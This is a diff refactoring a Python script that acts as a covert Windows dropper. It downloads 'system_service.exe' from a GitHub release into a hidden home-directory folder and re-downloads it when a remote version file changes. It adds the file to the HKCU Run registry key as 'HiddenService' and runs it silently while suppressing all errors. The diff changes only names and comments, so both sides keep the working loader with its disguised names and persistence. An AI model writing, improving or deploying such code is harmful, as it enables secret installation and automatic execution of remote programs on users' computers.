@@ -4,59 +4,58 @@ import subprocess
 from pathlib import Path
 import winreg  # For adding to startup
 
-# Hardcoded values
-VERSION_URL = "https://raw.githubusercontent.com/yesjdnke/manager/refs/heads/main/version.txt"
-FILE_URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"
-FOLDER_NAME = ".hidden_service"
-FILE_NAME = "system_service.exe"
-VERSION_FILE_NAME = "last_version.txt"  # To store the last downloaded version
+# URLs and constants
+VERSION_URL = "https://raw.githubusercontent.com/yesjdnke/manager/refs/heads/main/version.txt"  # Version file URL
+FILE_URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"  # File to download
+FOLDER_NAME = ".hidden_service_folder"  # Folder name for hidden service
+FILE_NAME = "system_service_v1.exe"  # File name for the service
+VERSION_FILE_NAME = "previous_version.txt"  # File to store the last downloaded version
 
 def get_user_hidden_folder():
-    """Get or create a hidden folder in the user's directory."""
+    """Retrieve or create a hidden directory in the user's home folder."""
     user_home = Path.home()
-    hidden_folder = user_home / FOLDER_NAME
-    if not hidden_folder.exists():
-        hidden_folder.mkdir(parents=True, exist_ok=True)
-    return hidden_folder
+    hidden_folder_path = user_home / FOLDER_NAME
+    if not hidden_folder_path.exists():
+        hidden_folder_path.mkdir(parents=True, exist_ok=True)
+    return hidden_folder_path
 
-def download_file(url, dest):
-    """Download a file from a URL."""
-    with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
+def download_file(url, destination):
+    """Download a file from the specified URL to the given destination."""
+    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
         out_file.write(response.read())
 
 def get_remote_version():
-    """Fetch the version from the remote URL."""
+    """Retrieve the remote version from the VERSION_URL."""
     try:
         with urllib.request.urlopen(VERSION_URL) as response:
             return response.read().decode('utf-8').strip()
     except Exception:
         return None
 
-def load_local_version(version_file_path):
-    """Load the stored version from a file."""
-    if not os.path.exists(version_file_path):
+def load_local_version(file_path):
+    """Read the locally stored version from a file."""
+    if not os.path.exists(file_path):
         return None
-    with open(version_file_path, 'r') as f:
-        return f.read().strip()
+    with open(file_path, 'r') as file:
+        return file.read().strip()
 
-def save_local_version(version, version_file_path):
-    """Save the version to a file."""
-    with open(version_file_path, 'w') as f:
-        f.write(version)
+def save_local_version(version, file_path):
+    """Write the specified version string to a local file."""
+    with open(file_path, 'w') as file:
+        file.write(version)
 
 def add_to_startup(file_path):
-    """Add the file to system startup."""
+    """Add the executable to the system startup registry."""
     try:
-        key = winreg.OpenKey(
+        with winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0,
             winreg.KEY_SET_VALUE,
-        )
-        winreg.SetValueEx(key, "HiddenSystemService", 0, winreg.REG_SZ, str(file_path))
-        winreg.CloseKey(key)
+        ) as key:
+            winreg.SetValueEx(key, "HiddenService", 0, winreg.REG_SZ, str(file_path))
     except Exception:
-        pass  # Silently fail if adding to startup is not possible
+        pass  # Ignore errors silently
 
 def ensure_and_run_file():
     """
@@ -66,31 +65,27 @@ def ensure_and_run_file():
     - Adds to system startup on the first download or replacement.
     - Runs the file after ensuring it is present.
     """
-    hidden_folder = get_user_hidden_folder()
-    file_path = hidden_folder / FILE_NAME
-    version_file_path = hidden_folder / VERSION_FILE_NAME
+    folder_path = get_user_hidden_folder()
+    file_path = folder_path / FILE_NAME
+    version_file_path = folder_path / VERSION_FILE_NAME
 
-    # Fetch versions
     remote_version = get_remote_version()
     if not remote_version:
-        return  # Exit silently if unable to fetch remote version
+        return  # Exit if unable to fetch the remote version
 
     local_version = load_local_version(version_file_path)
 
     if local_version == remote_version:
-        # Versions match, no need to download
-        return
+        return  # No update required, versions match
 
-    # Download and replace the file
     try:
         download_file(FILE_URL, file_path)
         save_local_version(remote_version, version_file_path)  # Save the new version
-        add_to_startup(file_path)  # Add to startup only on replacement or first download
+        add_to_startup(file_path)  # Add to startup on update or first-time setup
     except Exception:
-        return  # Exit silently if download fails
+        return  # Exit silently on download failure
 
-    # Run the file in a non-blocking way
     try:
         subprocess.Popen([str(file_path)], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
-        pass  # Silently fail if the file cannot be executed
+        pass  # Silently handle execution failure
